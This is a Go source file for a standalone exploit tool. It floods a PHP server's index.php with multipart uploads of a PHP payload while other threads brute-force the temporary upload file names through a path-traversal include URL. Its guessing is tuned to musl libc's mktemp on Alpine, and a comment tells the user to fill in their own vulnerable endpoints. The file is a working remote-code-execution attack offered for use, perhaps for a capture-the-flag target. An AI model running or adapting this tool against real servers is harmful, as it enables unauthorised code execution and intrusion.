package main

import (
	"bytes"
	"crypto/rand"
	"flag"
	"fmt"
	"io/ioutil"
	"log"
	"math/big"
	"mime/multipart"
	"net/http"
	"os"
	"os/signal"
	"runtime"
	"sync"
)

var die *sync.WaitGroup = &sync.WaitGroup{}
var spray_mutex *sync.Mutex = &sync.Mutex{}
var spray_count int
var pray_mutex *sync.Mutex = &sync.Mutex{}
var pray_count int

func genPayload(copies int) (*bytes.Buffer, string) {
	formBuf := &bytes.Buffer{}
	formWriter := multipart.NewWriter(formBuf)
	payload := []byte("<?php echo \"EVILOUTPUT\"; ?>")
	for i := 0; i < copies; i++ {
		w, e := formWriter.CreateFormFile(fmt.Sprintf("x%d", i), fmt.Sprintf("x%d.php", i))
		if e != nil {
			log.Println("genPayload CreateFormFile", e)
			continue
		}
		w.Write(payload)
	}
	contentType := formWriter.FormDataContentType()
	formWriter.Close()
	return formBuf, contentType
}

func spray(done <-chan bool, targetURL string, copies int, wid int, wmax int) {
	die.Add(1)
	defer die.Done()
	log.Println("sprayer", wid+1, "/", wmax, "starting")
	defer log.Println("sprayer", wid+1, "/", wmax, "stopping")
	client := &http.Client{}
	for {
		select {
		case <-done:
			return
		default:
			payload, contentType := genPayload(copies)
			r, e := client.Post(targetURL, contentType, payload)
			if e != nil {
				log.Println("spray http error", e)
				continue
			}
			_, e = ioutil.ReadAll(r.Body)
			r.Body.Close()
		}
	}
}

/*
mktemp musl libc
---
	__clock_gettime(CLOCK_REALTIME, &ts);
	r = ts.tv_nsec*65537 ^ (uintptr_t)&ts / 16 + (uintptr_t)template;
	for (i=0; i<6; i++, r>>=5)
		template[i] = 'A'+(r&15)+(r&16)*2;
---
*/

func genStraw() string {
	/* keyspace optimized for musl libc mktemp, i.e. alpine linux php */
	keyspace := "ABCDEFGHIJKLMNOPabcdefghijklmnop"
	max := big.NewInt(int64(len(keyspace)))
	guess := ""
	for i := 0; i < 6; i++ {
		x, e := rand.Int(rand.Reader, max)
		if e != nil {
			log.Println("genStraw rand Int error", e)
			return genStraw()
		}
		guess = fmt.Sprintf("%s%c", guess, keyspace[x.Int64()])
	}
	return guess
}

func pray(done <-chan bool, targetURLfmt string, wid int, wmax int) {
	die.Add(1)
	defer die.Done()
	log.Println("prayer", wid+1, "/", wmax, "starting")
	defer log.Println("prayer", wid+1, "/", wmax, "stopping")
	client := &http.Client{}
	for {
		select {
		case <-done:
			return
		default:
			break
		}
		straw := genStraw()
		targetURL := fmt.Sprintf(targetURLfmt, straw)
		r, e := client.Get(targetURL)
		if e != nil {
			log.Println("pray http error", e)
			continue
		}
		body, e := ioutil.ReadAll(r.Body)
		if bytes.Contains(body, []byte("EVILOUTPUT")) {
			log.Println(string(body))
			log.Println(straw)
			os.Exit(0)
			return
		}
		r.Body.Close()
	}
}

func main() {
	sprayers := flag.Int("sprayers", 95, "number of workers to spray")
	prayers := flag.Int("prayers", 5, "number of workers to pray")
	copies := flag.Int("copies", 20, "file copies per post")
	target := flag.String("target", "127.0.0.1:1337", "target host:port")
	flag.Parse()
	SprayTargetURL := fmt.Sprintf("http://%s/index.php", *target)
	PrayTargetURL := fmt.Sprintf("http://%s/index.php/..%%%%2f..%%%%2f..%%%%2ftmp%%%%2fphp%%s", *target) // N.B. fill in your own vulnerable end-points here
	runtime.GOMAXPROCS(*sprayers + *prayers + 1)
	done := make(chan bool)
	for i := 0; i < *sprayers; i++ {
		go spray(done, SprayTargetURL, *copies, i, *sprayers)
	}
	for i := 0; i < *prayers; i++ {
		go pray(done, PrayTargetURL, i, *prayers)
	}
	user := make(chan os.Signal, 1)
	signal.Notify(user, os.Interrupt)
	log.Println("Ctrl-C to terminate.")
	defer die.Wait()
	defer close(done)
	<-user
	log.Println("Interrupt received, terminating workers.")
}
